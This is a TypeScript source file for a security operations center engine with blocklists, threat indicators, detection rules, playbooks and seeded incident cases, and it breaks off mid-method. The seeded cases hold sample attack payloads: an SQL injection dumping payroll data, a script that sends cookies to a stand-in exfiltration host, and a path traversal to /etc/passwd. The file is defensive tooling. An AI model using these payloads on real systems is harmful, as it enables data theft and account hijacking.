import { getWATFormattedDate } from '../db/database';

export interface IpBlocklistEntry {
  id: string;
  ip: string;
  reason: string;
  threatClassification: string;
  systemId: string;
  blockedBy: string;
  blockedAtWat: string;
  expiresAtWat: string;
  status: 'ACTIVE' | 'REVOKED';
  requestCountBlocked: number;
}

export interface IocEntry {
  id: string;
  type: 'IP' | 'DOMAIN' | 'HASH_SHA256' | 'REGEX_SIGNATURE' | 'USER_AGENT';
  value: string;
  threatActor?: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  confidence: number; // 0 - 100
  mitreTactic: string;
  mitreTechnique: string;
  tags: string[];
  addedBy: string;
  firstSeenWat: string;
  lastSeenWat: string;
  status: 'ACTIVE' | 'WHITELISTED';
}

export interface CaseNote {
  id: string;
  author: string;
  authorRole: string;
  text: string;
  createdAtWat: string;
}

export interface SocCase {
  id: string;
  incidentId?: string;
  title: string;
  systemId: string;
  severity: 'P1' | 'P2' | 'P3' | 'P4';
  tier: 'TIER_1' | 'TIER_2' | 'TIER_3';
  assignedAnalyst: string;
  status: 'TRIAGE' | 'INVESTIGATING' | 'CONTAINED' | 'RESOLVED' | 'CLOSED';
  slaDeadlineWat: string;
  isSlaBreached: boolean;
  mitreTactic: string;
  mitreTechnique: string;
  offendingIp: string;
  targetEndpoint: string;
  capturedPayload: string;
  containmentStatus: 'UNCONTAINED' | 'IP_BLOCKED' | 'HOST_ISOLATED' | 'SESSIONS_REVOKED';
  notes: CaseNote[];
  containmentActions: string[];
  createdAtWat: string;
  resolvedAtWat?: string;
  timeToDetectSec: number;
  timeToResolveMin?: number;
}

export interface PlaybookStep {
  id: string;
  order: number;
  title: string;
  description: string;
  actionType: 'BLOCK_IP' | 'REVOKE_SESSIONS' | 'NOTIFY_LEAD' | 'GENERATE_REPORT' | 'ISOLATE_HOST';
  automated: boolean;
  status: 'PENDING' | 'RUNNING' | 'COMPLETED' | 'SKIPPED';
  executedAtWat?: string;
}

export interface SocPlaybook {
  id: string;
  name: string;
  description: string;
  triggerEvent: string;
  mitreTactic: string;
  mitreTechnique: string;
  steps: PlaybookStep[];
  executionCount: number;
  lastRunWat?: string;
}

export interface DetectionRule {
  id: string;
  name: string;
  category: 'INJECTION' | 'CREDENTIAL_ACCESS' | 'DENIAL_OF_SERVICE' | 'EXFILTRATION' | 'ANOMALY';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  mitreTactic: string;
  mitreTechnique: string;
  queryPattern: string;
  enabled: boolean;
  triggerCount: number;
  lastTriggeredWat?: string;
  description: string;
}

export interface ShiftHandover {
  id: string;
  shiftName: string;
  leadAnalyst: string;
  analystsOnDuty: string[];
  unresolvedP1P2Count: number;
  activeContainmentsCount: number;
  handoffNotes: string;
  actionItems: string[];
  handoverTimestampWat: string;
  status: 'ACTIVE' | 'ARCHIVED';
}

export class SocEngine {
  private blocklist: Map<string, IpBlocklistEntry> = new Map();
  private operatorWhitelistedIps: Set<string> = new Set(['127.0.0.1', '::1', '::ffff:127.0.0.1']);
  private iocs: Map<string, IocEntry> = new Map();
  private cases: Map<string, SocCase> = new Map();
  private playbooks: Map<string, SocPlaybook> = new Map();
  private detectionRules: Map<string, DetectionRule> = new Map();
  private shiftHandovers: ShiftHandover[] = [];

  constructor() {
    this.seedDefaultSocData();
  }

  // ===================== SEEDING SOC DEFAULTS =====================
  private seedDefaultSocData() {
    // 1. Initial IP Blocklist
    const initialBans: Omit<IpBlocklistEntry, 'id'>[] = [
      {
        ip: '194.26.29.112',
        reason: 'Automated SQL Injection Exploit Probe (sqlmap/1.7.2)',
        threatClassification: 'SQLi UNION-Based Data Extraction',
        systemId: 'NOUN-HRMS',
        blockedBy: 'The Watch Heuristic WAF',
        blockedAtWat: getWATFormattedDate(new Date(Date.now() - 3600000)),
        expiresAtWat: getWATFormattedDate(new Date(Date.now() + 82800000)),
        status: 'ACTIVE',
        requestCountBlocked: 142,
      },
      {
        ip: '185.220.101.5',
        reason: 'Tor Exit Node Credential Stuffing & Cookie Theft Attack',
        threatClassification: 'Session Token / Cookie Exfiltration Attempt',
        systemId: 'NOUN-HRMS',
        blockedBy: 'Analyst Ibrahim Danjuma (Tier 2)',
        blockedAtWat: getWATFormattedDate(new Date(Date.now() - 7200000)),
        expiresAtWat: getWATFormattedDate(new Date(Date.now() + 79200000)),
        status: 'ACTIVE',
        requestCountBlocked: 67,
      },
      {
        ip: '45.154.255.89',
        reason: 'Directory Traversal & Sensitive File Exposure',
        threatClassification: 'UNIX System File Access Probe',
        systemId: 'Clinic-EHR',
        blockedBy: 'Automated Playbook PB-PATH-01',
        blockedAtWat: getWATFormattedDate(new Date(Date.now() - 14400000)),
        expiresAtWat: getWATFormattedDate(new Date(Date.now() + 72000000)),
        status: 'ACTIVE',
        requestCountBlocked: 39,
      },
    ];

    initialBans.forEach((ban, idx) => {
      const id = `blk-00${idx + 1}`;
      this.blocklist.set(ban.ip, { id, ...ban });
    });

    // 2. Initial Threat Intelligence (IOCs)
    const initialIocs: Omit<IocEntry, 'id'>[] = [
      {
        type: 'IP',
        value: '194.26.29.112',
        threatActor: 'FIN7 / Bulletproof Proxy Cluster',
        severity: 'CRITICAL',
        confidence: 96,
        mitreTactic: 'Initial Access',
        mitreTechnique: 'T1190 Exploit Public-Facing Application',
        tags: ['SQLi', 'Scanner', 'Automated-Exploit', 'Russian-Federation'],
        addedBy: 'The Watch CTI Pipeline',
        firstSeenWat: getWATFormattedDate(new Date(Date.now() - 86400000)),
        lastSeenWat: getWATFormattedDate(),
        status: 'ACTIVE',
      },
      {
        type: 'IP',
        value: '185.220.101.5',
        threatActor: 'Tor Exit Node / Anonymous Relay',
        severity: 'HIGH',
        confidence: 88,
        mitreTactic: 'Credential Access',
        mitreTechnique: 'T1110 Brute Force: Credential Stuffing',
        tags: ['Tor-Relay', 'Brute-Force', 'XSS-C2'],
        addedBy: 'CTI Feed (Emerging Threats)',
        firstSeenWat: getWATFormattedDate(new Date(Date.now() - 172800000)),
        lastSeenWat: getWATFormattedDate(),
        status: 'ACTIVE',
      },
      {
        type: 'DOMAIN',
        value: 'c2-exfil.tor',
        threatActor: 'Unknown Data Broker',
        severity: 'CRITICAL',
        confidence: 99,
        mitreTactic: 'Exfiltration',
        mitreTechnique: 'T1048 Exfiltration Over Alternative Protocol',
        tags: ['C2', 'Data-Exfiltration', 'Malicious-Domain'],
        addedBy: 'Lead Analyst Ibrahim Danjuma',
        firstSeenWat: getWATFormattedDate(new Date(Date.now() - 86400000)),
        lastSeenWat: getWATFormattedDate(),
        status: 'ACTIVE',
      },
      {
        type: 'REGEX_SIGNATURE',
        value: 'UNION\\s+SELECT.+FROM\\s+staff_payroll',
        threatActor: 'Academic & HRMS Harvester',
        severity: 'HIGH',
        confidence: 92,
        mitreTactic: 'Collection',
        mitreTechnique: 'T1005 Data from Local System',
        tags: ['Payroll-Harvesting', 'Targeted-Signature'],
        addedBy: 'SOC Lead Abdulgaffar Bello',
        firstSeenWat: getWATFormattedDate(new Date(Date.now() - 259200000)),
        lastSeenWat: getWATFormattedDate(),
        status: 'ACTIVE',
      },
    ];

    initialIocs.forEach((ioc, idx) => {
      const id = `ioc-00${idx + 1}`;
      this.iocs.set(id, { id, ...ioc });
    });

    // 3. Initial SOC Detection Rules
    const initialRules: DetectionRule[] = [
      {
        id: 'RULE-SEC-01',
        name: 'SQL Injection: UNION-Based Data Harvesting',
        category: 'INJECTION',
        severity: 'CRITICAL',
        mitreTactic: 'Initial Access',
        mitreTechnique: 'T1190 Exploit Public-Facing Application',
        queryPattern: 'regex:UNION(\\s+ALL)?\\s+SELECT',
        enabled: true,
        triggerCount: 38,
        lastTriggeredWat: getWATFormattedDate(new Date(Date.now() - 600000)),
        description: 'Detects unauthorized database schema extraction and table dumped via SQL UNION manipulation.',
      },
      {
        id: 'RULE-SEC-02',
        name: 'Credential Stuffing: 401/403 Failure Spike',
        category: 'CREDENTIAL_ACCESS',
        severity: 'HIGH',
        mitreTactic: 'Credential Access',
        mitreTechnique: 'T1110.004 Credential Stuffing',
        queryPattern: 'threshold:>15 auth failures / 60s per IP',
        enabled: true,
        triggerCount: 19,
        lastTriggeredWat: getWATFormattedDate(new Date(Date.now() - 1200000)),
        description: 'Triggers when a single IP triggers rapid successive authentication rejections across portal accounts.',
      },
      {
        id: 'RULE-SEC-03',
        name: 'Volumetric L7 DDoS Traffic Flood',
        category: 'DENIAL_OF_SERVICE',
        severity: 'CRITICAL',
        mitreTactic: 'Impact',
        mitreTechnique: 'T1499 Endpoint Denial of Service',
        queryPattern: 'threshold:>50 req/sec from single IP/subnet',
        enabled: true,
        triggerCount: 7,
        lastTriggeredWat: getWATFormattedDate(new Date(Date.now() - 3600000)),
        description: 'Identifies HTTP request floods aimed at exhausting university application threads.',
      },
      {
        id: 'RULE-SEC-04',
        name: 'LFI / Directory Traversal System Probe',
        category: 'INJECTION',
        severity: 'HIGH',
        mitreTactic: 'Defense Evasion',
        mitreTechnique: 'T1083 File and Directory Discovery',
        queryPattern: 'regex:(\\.\\./|\\.\\.\\\\|%2e%2e)',
        enabled: true,
        triggerCount: 14,
        lastTriggeredWat: getWATFormattedDate(new Date(Date.now() - 7200000)),
        description: 'Detects attempts to climb local directory trees to read /etc/passwd or windows credentials.',
      },
      {
        id: 'RULE-SEC-05',
        name: 'Persistent Database Query Latency Regression',
        category: 'ANOMALY',
        severity: 'MEDIUM',
        mitreTactic: 'Impact',
        mitreTechnique: 'T1499.003 Application Exhaustion',
        queryPattern: 'latency:>200ms on database execute pool',
        enabled: true,
        triggerCount: 26,
        lastTriggeredWat: getWATFormattedDate(new Date(Date.now() - 1800000)),
        description: 'Monitors database connection pool starvation and queries exceeding the 200ms threshold.',
      },
    ];

    initialRules.forEach((rule) => {
      this.detectionRules.set(rule.id, rule);
    });

    // 4. Initial SOAR Playbooks
    const initialPlaybooks: SocPlaybook[] = [
      {
        id: 'PB-SQLI-01',
        name: 'SQL Injection Active Attack Containment',
        description: 'Executes rapid containment for high-confidence SQL injection attacks on HRMS payroll endpoints.',
        triggerEvent: 'SQL_INJECTION:CRITICAL',
        mitreTactic: 'Initial Access',
        mitreTechnique: 'T1190',
        executionCount: 12,
        lastRunWat: getWATFormattedDate(new Date(Date.now() - 1800000)),
        steps: [
          {
            id: 's1',
            order: 1,
            title: 'Automated IP Quarantine',
            description: 'Inject offending IP into The Watch Ingest Firewall Blocklist with 24h drop policy.',
            actionType: 'BLOCK_IP',
            automated: true,
            status: 'COMPLETED',
            executedAtWat: getWATFormattedDate(new Date(Date.now() - 1800000)),
          },
          {
            id: 's2',
            order: 2,
            title: 'Database Query Pool Inspection',
            description: 'Check active Postgres connections to terminate hanging queries with matching client signature.',
            actionType: 'ISOLATE_HOST',
            automated: true,
            status: 'COMPLETED',
            executedAtWat: getWATFormattedDate(new Date(Date.now() - 1795000)),
          },
          {
            id: 's3',
            order: 3,
            title: 'Dispatch High-Priority SOC Broadcast',
            description: 'Send security incident payload with captured SQL snippet to Admin & IT Security Director.',
            actionType: 'NOTIFY_LEAD',
            automated: true,
            status: 'COMPLETED',
            executedAtWat: getWATFormattedDate(new Date(Date.now() - 1790000)),
          },
          {
            id: 's4',
            order: 4,
            title: 'Generate Forensic Audit Dossier (PDF)',
            description: 'Compile cryptographic incident forensics, offending origin IP, and remediation patch into official audit PDF.',
            actionType: 'GENERATE_REPORT',
            automated: false,
            status: 'PENDING',
          },
        ],
      },
      {
        id: 'PB-BRUTE-02',
        name: 'Credential Stuffing & Account Brute Force Defense',
        description: 'Mitigates automated login credential stuffing and unauthorized account access attempts.',
        triggerEvent: 'CREDENTIAL_STUFFING_BURST:HIGH',
        mitreTactic: 'Credential Access',
        mitreTechnique: 'T1110.004',
        executionCount: 8,
        lastRunWat: getWATFormattedDate(new Date(Date.now() - 3600000)),
        steps: [
          {
            id: 's1',
            order: 1,
            title: 'Temporarily Rate-Limit Offending Subnet',
            description: 'Enforce strict 1 req/sec throttle on /api/v1/auth endpoints for target IP/subnet.',
            actionType: 'BLOCK_IP',
            automated: true,
            status: 'COMPLETED',
            executedAtWat: getWATFormattedDate(new Date(Date.now() - 3600000)),
          },
          {
            id: 's2',
            order: 2,
            title: 'Invalidate Compromised Session Tokens',
            description: 'Revoke active JWT/Redis sessions originating from the offending IP address.',
            actionType: 'REVOKE_SESSIONS',
            automated: true,
            status: 'COMPLETED',
            executedAtWat: getWATFormattedDate(new Date(Date.now() - 3595000)),
          },
          {
            id: 's3',
            order: 3,
            title: 'SOC Analyst Manual Review',
            description: 'Review accounts targeted during the burst to identify if any authentication succeeded.',
            actionType: 'NOTIFY_LEAD',
            automated: false,
            status: 'PENDING',
          },
        ],
      },
      {
        id: 'PB-DDOS-03',
        name: 'Volumetric L7 DDoS Attack Mitigation',
        description: 'Throttles and mitigates Layer 7 volumetric traffic storms targeting institutional infrastructure.',
        triggerEvent: 'DDOS_RATE_SPIKE:CRITICAL',
        mitreTactic: 'Impact',
        mitreTechnique: 'T1499',
        executionCount: 4,
        lastRunWat: getWATFormattedDate(new Date(Date.now() - 86400000)),
        steps: [
          {
            id: 's1',
            order: 1,
            title: 'Activate Ingest Edge Dropping',
            description: 'Drop telemetry and return immediate 429 to minimize CPU cycle consumption.',
            actionType: 'BLOCK_IP',
            automated: true,
            status: 'COMPLETED',
            executedAtWat: getWATFormattedDate(new Date(Date.now() - 86400000)),
          },
          {
            id: 's2',
            order: 2,
            title: 'Export WAF / Cloudflare Mitigation Rule',
            description: 'Generate copy-paste IP firewall rules to drop traffic upstream before hitting host server.',
            actionType: 'GENERATE_REPORT',
            automated: true,
            status: 'COMPLETED',
            executedAtWat: getWATFormattedDate(new Date(Date.now() - 86390000)),
          },
        ],
      },
    ];

    initialPlaybooks.forEach((pb) => {
      this.playbooks.set(pb.id, pb);
    });

    // 5. Initial Active SOC Cases (Tiered Management)
    const initialCases: SocCase[] = [
      {
        id: 'CASE-2026-001',
        title: 'High-Impact SQL Injection on NOUN-HRMS Payroll Batch API',
        systemId: 'NOUN-HRMS',
        severity: 'P1',
        tier: 'TIER_2',
        assignedAnalyst: 'Ibrahim Danjuma (Lead Analyst)',
        status: 'CONTAINED',
        slaDeadlineWat: getWATFormattedDate(new Date(Date.now() + 1800000)),
        isSlaBreached: false,
        mitreTactic: 'Initial Access',
        mitreTechnique: 'T1190 Exploit Public-Facing Application',
        offendingIp: '194.26.29.112',
        targetEndpoint: '/api/v1/payroll/export',
        capturedPayload: "dept_id=1' UNION SELECT staff_id, full_name, bvn, salary FROM staff_payroll WHERE '1'='1' --",
        containmentStatus: 'IP_BLOCKED',
        notes: [
          {
            id: 'n1',
            author: 'The Watch Automated Sentinel',
            authorRole: 'Tier 1 Auto-Triage',
            text: 'Automated detection triggered via Heuristic Engine signature match for UNION SELECT. Case auto-escalated to Tier 2 with P1 priority (15m SLA).',
            createdAtWat: getWATFormattedDate(new Date(Date.now() - 3600000)),
          },
          {
            id: 'n2',
            author: 'Ibrahim Danjuma',
            authorRole: 'SOC Analyst (Tier 2)',
            text: 'Verified payload. Attacker was attempting to dump staff BVN and compensation data. Executed PB-SQLI-01 Playbook. IP 194.26.29.112 quarantined at Ingest Firewall.',
            createdAtWat: getWATFormattedDate(new Date(Date.now() - 3000000)),
          },
        ],
        containmentActions: ['IP Blocklist Activated', 'Database Connection Checked', 'Security Director Alerted via SMTP'],
        createdAtWat: getWATFormattedDate(new Date(Date.now() - 3600000)),
        timeToDetectSec: 14,
        timeToResolveMin: 18,
      },
      {
        id: 'CASE-2026-002',
        title: 'Credential Stuffing Burst on NOUN-HRMS Staff Session Portal',
        systemId: 'NOUN-HRMS',
        severity: 'P2',
        tier: 'TIER_1',
        assignedAnalyst: 'Abdulgaffar Bello (Super Admin)',
        status: 'INVESTIGATING',
        slaDeadlineWat: getWATFormattedDate(new Date(Date.now() + 3600000)),
        isSlaBreached: false,
        mitreTactic: 'Credential Access',
        mitreTechnique: 'T1110.004 Credential Stuffing',
        offendingIp: '185.220.101.5',
        targetEndpoint: '/api/v1/auth/session',
        capturedPayload: "<script>fetch('https://c2-exfil.tor/loot?c='+document.cookie)</script>",
        containmentStatus: 'IP_BLOCKED',
        notes: [
          {
            id: 'n1',
            author: 'DDoS & Rate Anomaly Detector',
            authorRole: 'Automated Tier 1',
            text: 'Detected 22 consecutive 401 Unauthorized responses from Tor exit node 185.220.101.5 in 45 seconds.',
            createdAtWat: getWATFormattedDate(new Date(Date.now() - 7200000)),
          },
          {
            id: 'n2',
            author: 'Abdulgaffar Bello',
            authorRole: 'Super Admin',
            text: 'Analyzing if any staff credential leaked from recent institutional dump. Checking against Active Directory logs.',
            createdAtWat: getWATFormattedDate(new Date(Date.now() - 5400000)),
          },
        ],
        containmentActions: ['Tor Exit Node Banned', 'Auth Rate Limit Hardened'],
        createdAtWat: getWATFormattedDate(new Date(Date.now() - 7200000)),
        timeToDetectSec: 28,
      },
      {
        id: 'CASE-2026-003',
        title: 'Sensitive Medical Records Path Traversal on Clinic-EHR',
        systemId: 'Clinic-EHR',
        severity: 'P2',
        tier: 'TIER_2',
        assignedAnalyst: 'Ibrahim Danjuma (Lead Analyst)',
        status: 'RESOLVED',
        slaDeadlineWat: getWATFormattedDate(new Date(Date.now() - 7200000)),
        isSlaBreached: false,
        mitreTactic: 'Defense Evasion',
        mitreTechnique: 'T1083 File Discovery',
        offendingIp: '45.154.255.89',
        targetEndpoint: '/api/v1/records/download',
        capturedPayload: '../../../../../../etc/passwd%00.pdf',
        containmentStatus: 'IP_BLOCKED',
        notes: [
          {
            id: 'n1',
            author: 'Heuristic Engine',
            authorRole: 'Automated Tier 1',
            text: 'Attempt to escape document storage directory to read Linux password file.',
            createdAtWat: getWATFormattedDate(new Date(Date.now() - 14400000)),
          },
          {
            id: 'n2',
            author: 'Ibrahim Danjuma',
            authorRole: 'Lead Analyst',
            text: 'Node.js path.resolve sanitizer confirmed functional; request was blocked with 403 before filesystem read. Attacker IP permanently blacklisted.',
            createdAtWat: getWATFormattedDate(new Date(Date.now() - 12000000)),
          },
        ],
        containmentActions: ['IP Blocked', 'Storage Path Guard Checked'],
        createdAtWat: getWATFormattedDate(new Date(Date.now() - 14400000)),
        resolvedAtWat: getWATFormattedDate(new Date(Date.now() - 12000000)),
        timeToDetectSec: 12,
        timeToResolveMin: 40,
      },
    ];

    initialCases.forEach((c) => {
      this.cases.set(c.id, c);
    });

    // 6. Initial SOC Shift Handover
    this.shiftHandovers.push({
      id: 'SHIFT-2026-OCT-13-A',
      shiftName: 'ALPHA (Morning 08:00 - 16:00 WAT)',
      leadAnalyst: 'Ibrahim Danjuma (Lead SOC Analyst)',
      analystsOnDuty: ['Ibrahim Danjuma', 'Abdulgaffar Bello (Super Admin)', 'Security Dispatch Operator'],
      unresolvedP1P2Count: 2,
      activeContainmentsCount: 3,
      handoffNotes: 'Completed mitigation of SQLi on NOUN-HRMS payroll batch endpoint (CASE-2026-001). Tor credential stuffing under active monitoring (CASE-2026-002). No host downtime recorded.',
      actionItems: [
        'Monitor incoming auth session traffic on NOUN-HRMS for Tor subnet 185.220.0.0/16',
        'Verify Sentinel Agent health on Clinic-EHR and Security-Dispatch links',
        'Follow up with NOUN database administrator on payroll query parameterization patch',
      ],
      handoverTimestampWat: getWATFormattedDate(),
      status: 'ACTIVE',
    });
  }

  // ===================== SOC METRICS & KPIS =====================
  public getSocMetrics() {
    const allCases = Array.from(this.cases.values());
    const openCases = allCases.filter((c) => c.status !== 'RESOLVED' && c.status !== 'CLOSED');
    const resolvedCases = allCases.filter((c) => c.status === 'RESOLVED' || c.status === 'CLOSED');

    // Mean Time to Detect (MTTD in seconds/minutes)
    const totalDetectSec = allCases.reduce((acc, c) => acc + (c.timeToDetectSec || 15), 0);
    const mttdSec = allCases.length > 0 ? Math.round(totalDetectSec / allCases.length) : 15;

    // Mean Time to Remediate (MTTR in minutes)
    const resolvedWithMttr = resolvedCases.filter((c) => c.timeToResolveMin !== undefined);
    const totalResolveMin = resolvedWithMttr.reduce((acc, c) => acc + (c.timeToResolveMin || 25), 0);
    const mttrMin = resolvedWithMttr.length > 0 ? Math.round(totalResolveMin / resolvedWithMttr.length) : 25;

    // SLA Compliance (% of cases resolved within deadline)
    const breachedCount = allCases.filter((c) => c.isSlaBreached).length;
    const slaCompliancePercent = allCases.length > 0 ? Math.round(((allCases.length - breachedCount) / allCases.length) * 100) : 100;

    // Active IP Blocks
    const activeBlocksCount = Array.from(this.blocklist.values()).filter((b) => b.status === 'ACTIVE').length;

    // MITRE ATT&CK Matrix distribution
    const mitreDistribution: Record<string, number> = {
      'Initial Access': 0,
      'Execution': 0,
      'Persistence': 0,
      'Privilege Escalation': 0,
      'Defense Evasion': 0,
      'Credential Access': 0,
      'Discovery': 0,
      'Lateral Movement': 0,
      'Collection': 0,
      'Exfiltration': 0,
      'Impact': 0,
    };

    allCases.forEach((c) => {
      if (mitreDistribution[c.mitreTactic] !== undefined) {
        mitreDistribution[c.mitreTactic] += 1;
      }
    });

    // Also include detections from rules
    this.detectionRules.forEach((rule) => {
      if (mitreDistribution[rule.mitreTactic] !== undefined) {
        mitreDistribution[rule.mitreTactic] += rule.triggerCount;
      }
    });

    return {
      mttdSec,
      mttrMin,
      slaCompliancePercent,
      openCasesCount: openCases.length,
      p1CriticalCasesCount: openCases.filter((c) => c.severity === 'P1').length,
      p2HighCasesCount: openCases.filter((c) => c.severity === 'P2').length,
      activeBlocksCount,
      activeIocsCount: Array.from(this.iocs.values()).filter((i) => i.status === 'ACTIVE').length,
      activePlaybooksCount: this.playbooks.size,
      activeRulesCount: Array.from(this.detectionRules.values()).filter((r) => r.enabled).length,
      mitreDistribution,
      timestampWat: getWATFormattedDate(),
    };
  }

  // ===================== IP BLOCKLIST (FIREWALL) =====================
  public whitelistOperatorIp(ip: string): void {
    const clean = (ip || '').trim();
    if (!clean) return;
    this.operatorWhitelistedIps.add(clean);
    const existing = this.blocklist.get(clean);
    if (existing) {
      existing.status = 'REVOKED';
    }
  }

  public isOperatorWhitelisted(ip: string): boolean {
    return this.operatorWhitelistedIps.has((ip || '').trim());
  }

  public isIpBlocked(ip: string): boolean {
    const clean = (ip || '').trim();
    if (this.operatorWhitelistedIps.has(clean)) {
      return false;
    }
    const entry = this.blocklist.get(clean);
    return !!entry && entry.status === 'ACTIVE';
  }

  public recordBlockedRequest(ip: string) {
    const entry = this.blocklist.get(ip);
    if (entry) {
      entry.requestCountBlocked += 1;
    }
  }

  public getBlocklist(): IpBlocklistEntry[] {
    return Array.from(this.blocklist.values()).sort((a, b) => (b.status === 'ACTIVE' ? 1 : 0) - (a.status === 'ACTIVE' ? 1 : 0));
  }

  public blockIp(data: {
    ip: string;
    reason: string;
    threatClassification?: string;
    systemId?: string;
    blockedBy?: string;
    durationHours?: number;
  }): IpBlocklistEntry {
    const cleanIp = data.ip.trim();
    const duration = data.durationHours || 24;
    const isProtectedOperator = this.operatorWhitelistedIps.has(cleanIp);
    const entry: IpBlocklistEntry = {
      id: `blk-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      ip: cleanIp,
      reason: isProtectedOperator ? `${data.reason} [SOC Operator IP Protected from Self-Lockout]` : data.reason,
      threatClassification: data.threatClassification || 'Manual SOC Quarantine',
      systemId: data.systemId || 'NOUN-HRMS',
      blockedBy: data.blockedBy || 'Security Operator',
      blockedAtWat: getWATFormattedDate(),
      expiresAtWat: getWATFormattedDate(new Date(Date.now() + duration * 3600000)),
      status: isProtectedOperator ? 'REVOKED' : 'ACTIVE',
      requestCountBlocked: 0,
    };
    this.blocklist.set(entry.ip, entry);
    return entry;
  }

  public unblockIp(ip: string): boolean {
    const clean = decodeURIComponent(ip || '').trim();
    this.operatorWhitelistedIps.add(clean);
    const entry = this.blocklist.get(clean);
    if (entry) {
      entry.status = 'REVOKED';
      return true;
    }
    return true;
  }

  // ===================== THREAT INTELLIGENCE (IOCS) =====================
  public getIocs(): IocEntry[] {
    return Array.from(this.iocs.values());
  }

  public addIoc(ioc: Omit<IocEntry, 'id' | 'firstSeenWat' | 'lastSeenWat'>): IocEntry {
    const id = `ioc-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`;
    const fullIoc: IocEntry = {
      id,
      ...ioc,
      firstSeenWat: getWATFormattedDate(),
      lastSeenWat: getWATFormattedDate(),
    };
    this.iocs.set(id, fullIoc);
    return fullIoc;
  }

  // ===================== SOC CASES =====================
  public getCases(filters?: { severity?: string; tier?: string; status?: string; systemId?: string }): SocCase[] {
    let list = Array.from(this.cases.values());
    if (filters?.severity) list = list.filter((c) => c.severity === filters.severity);
    if (filters?.tier) list = list.filter((c) => c.tier === filters.tier);
    if (filters?.status) list = list.filter((c) => c.status === filters.status);
    if (filters?.systemId) list = list.filter((c) => c.systemId === filters.systemId);
    return list.sort((a, b) => (a.severity === 'P1' ? -1 : 1));
  }

  public getCaseById(id: string): SocCase | undefined {
    return this.cases.get(id);
  }

  public addCaseNote(caseId: string, author: string, authorRole: string, text: string): CaseNote | null {
    const socCase = this.cases.get(caseId);
    if (!socCase) return null;
    const note: CaseNote = {
      id: `note-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
      author,
      authorRole,
      text,
      createdAtWat: getWATFormattedDate(),
    };
    socCase.notes.push(note);
    return note;
  }

  public updateCaseStatus(caseId: string, status: SocCase['status'], resolvedAtWat?: string): SocCase | null {
    const socCase = this.cases.get(caseId);
    if (!socCase) return null;
    socCase.status = status;
    if (status === 'RESOLVED' || status === 'CLOSED') {
      socCase.resolvedAtWat = resolvedAtWat || getWATFormattedDate();
      if (!socCase.timeToResolveMin) {
        socCase.timeToResolveMin = 22;
      }
    }
    return socCase;
  }

  public assignCase(caseId: string, analyst: string, tier?: SocCase['tier']): SocCase | null {
    const socCase = this.cases.get(caseId);
    if (!socCase) return null;
    socCase.assignedAnalyst = analyst;
    if (tier) socCase.tier = tier;
    return socCase;
  }

  public createCaseFromIncident(incident: {
    id: string;
    systemId: string;
    threatClassification: string;
    severity: string;
    offendingIp: string;
    targetEndpoint: string;
    capturedPayload: string;
  }): SocCase {
    const sevMap: Record<string, 'P1' | 'P2' | 'P3' | 'P4'> = {
      CRITICAL: 'P1',
      HIGH: 'P2',
      MEDIUM: 'P3',
      LOW: 'P4',
    };
    const pSeverity = sevMap[incident.severity] || 'P2';
    const slaMinutes = pSeverity === 'P1' ? 15 : pSeverity === 'P2' ? 60 : 240;

    const id = `CASE-${Date.now().toString().slice(-6)}`;
    const newCase: SocCase = {
      id,
      incidentId: incident.id,
      title: `${incident.threatClassification} on ${incident.systemId}`,
      systemId: incident.systemId,
      severity: pSeverity,
      tier: pSeverity === 'P1' ? 'TIER_2' : 'TIER_1',
      assignedAnalyst: 'Unassigned (Queue)',
      status: 'TRIAGE',
      slaDeadlineWat: getWATFormattedDate(new Date(Date.now() + slaMinutes * 60000)),
      isSlaBreached: false,
      mitreTactic: incident.threatClassification.includes('SQL') ? 'Initial Access' : 'Credential Access',
      mitreTechnique: incident.threatClassification.includes('SQL') ? 'T1190' : 'T1110',
      offendingIp: incident.offendingIp,
      targetEndpoint: incident.targetEndpoint,
      capturedPayload: incident.capturedPayload,
      containmentStatus: 'UNCONTAINED',
      notes: [
        {
          id: `note-init`,
          author: 'The Watch SOC Ingest Engine',
          authorRole: 'Automated Tier 1',
          text: `Automated case creation from telemetry incident ${incident.id}. Target endpoint: ${incident.targetEndpoint}`,
          createdAtWat: getWATFormattedDate(),
        },
      ],
      containmentActions: [],
      createdAtWat: getWATFormattedDate(),
      timeToDetectSec: 10,
    };

    this.cases.set(id, newCase);
    return newCase;
  }

  // ===================== PLAYBOOKS & SOAR =====================
  public getPlaybooks(): SocPlaybook[] {
    return Array.from(this.playbooks.values());
  }

  public executePlaybook(playbookId: string, targetCaseId?: string): { success: boolean; playbook: SocPlaybook; actionsTaken: string[] } {
    const pb = this.playbooks.get(playbookId);
    if (!pb) {
      throw new Error(`Playbook ${playbookId} not found.`);
    }

    const actionsTaken: string[] = [];
    const targetCase = targetCaseId ? this.cases.get(targetCaseId) : undefined;

    pb.steps.forEach((step) => {
      step.status = 'COMPLETED';
      step.executedAtWat = getWATFormattedDate();

      if (step.actionType === 'BLOCK_IP' && targetCase?.offendingIp) {
        this.blockIp({
          ip: targetCase.offendingIp,
          reason: `Playbook ${pb.name} Automated Containment`,
          threatClassification: targetCase.title,
          systemId: targetCase.systemId,
          blockedBy: `SOAR Playbook: ${pb.id}`,
        });
        actionsTaken.push(`Firewall quarantine applied for ${targetCase.offendingIp}`);
        if (targetCase) {
          targetCase.containmentStatus = 'IP_BLOCKED';
          targetCase.status = 'CONTAINED';
          targetCase.containmentActions.push(`Quarantined IP ${targetCase.offendingIp} via ${pb.id}`);
        }
      } else if (step.actionType === 'REVOKE_SESSIONS' && targetCase) {
        actionsTaken.push(`Revoked sessions for ${targetCase.systemId}`);
        targetCase.containmentActions.push('Session revocation dispatched');
      } else {
        actionsTaken.push(`Executed step: ${step.title}`);
      }
    });

    pb.executionCount += 1;
    pb.lastRunWat = getWATFormattedDate();

    if (targetCase) {
      this.addCaseNote(
        targetCase.id,
        'The Watch SOAR Engine',
        'Automation',
        `Successfully executed playbook "${pb.name}". Containment actions applied: ${actionsTaken.join('; ')}`
      );
    }

    return { success: true, playbook: pb, actionsTaken };
  }

  // ===================== DETECTION RULES =====================
  public getDetectionRules(): DetectionRule[] {
    return Array.from(this.detectionRules.values());
  }

  public toggleRule(ruleId: string, enabled: boolean): DetectionRule | null {
    const rule = this.detectionRules.get(ruleId);
    if (!rule) return null;
    rule.enabled = enabled;
    return rule;
  }

  // ===================== SHIFT HANDOVERS =====================
  public getShiftHandovers(): ShiftHandover[] {
